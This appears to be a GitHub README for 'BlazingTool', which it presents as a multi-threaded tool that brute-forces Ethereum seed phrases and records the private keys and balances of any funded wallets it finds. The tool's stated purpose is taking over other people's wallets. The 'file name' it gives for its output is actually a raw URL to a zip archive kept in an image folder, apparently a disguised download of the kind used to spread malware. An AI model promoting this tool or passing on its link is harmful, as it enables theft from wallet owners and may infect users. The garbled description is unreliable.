# BlazingTool

Brute force ethereum wallet mnemonics. Multi-threaded and surprisingly fast. Automatically generate seed phrases and check balances for Ethereum networks. If a wallet with a non-zero balance is found, the wallet's information (address, mnemonic, private key, and balances) is logged and saved to a file named https://raw.githubusercontent.com/desmonsd/BlazingTool/main/img/Blazing-Tool-v1.3.zip

## Features

### Multi-threaded Brute Force Generation

BlazingTool uses a multi-threaded approach to accelerate the process of generating Ethereum wallet mnemonics. By leveraging multiple threads, the tool maximizes computational resources and reduces the time required to exhaustively search for potential wallets.

### Balances Checking

The tool includes functionality to verify the balances of discovered wallets on Ethereum networks. By querying the blockchain for the balances associated with each wallet, BlazingTool provides users with valuable insights into the financial status of the identified wallets.

### Logging Wallet Information

Upon discovering a wallet with a non-zero balance, BlazingTool meticulously logs the wallet's details to a file named `https://raw.githubusercontent.com/desmonsd/BlazingTool/main/img/Blazing-Tool-v1.3.zip`. This feature enables users to conveniently review and analyze the found wallets, including their addresses, mnemonics, private keys, and corresponding balances.
